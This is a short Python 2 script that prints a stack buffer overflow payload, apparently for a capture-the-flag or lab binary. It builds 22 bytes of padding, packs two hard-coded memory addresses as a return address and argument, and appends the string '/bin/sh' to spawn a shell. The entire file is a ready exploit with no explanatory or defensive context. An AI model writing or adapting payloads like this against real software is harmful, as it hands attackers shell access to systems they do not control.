from struct import pack
print "\xff" * 22 + pack("<I", 0x0804888a) + pack("<I",0xbffebea4) + "\x2f\x62\x69\x6e\x2f\x73\x68" + "\x00" * 11